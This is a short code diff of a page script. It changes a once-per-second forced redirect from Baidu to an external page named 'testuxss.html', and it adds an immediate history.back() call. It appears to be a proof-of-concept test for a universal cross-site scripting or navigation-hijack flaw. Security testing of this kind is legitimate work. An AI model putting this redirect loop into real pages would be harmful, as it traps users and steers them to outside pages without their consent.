@@ -1,14 +1,13 @@
 <script>
+    history.back()
+
     function onBindSheetCloseCallback() {
+        
         // 每隔一秒执行一次跳转到百度的函数
         setInterval(function() {
-            window.location.href = "https://www.baidu.com/";
+            window.location.href = "https://bogu12138.github.io/Pages/testuxss.html";
         }, 1000);
 
-        // 每隔一秒执行一次浏览器后退操作
-        setInterval(function() {
-            history.back();
-        }, 1000);
 
         console.log(123456);
     }
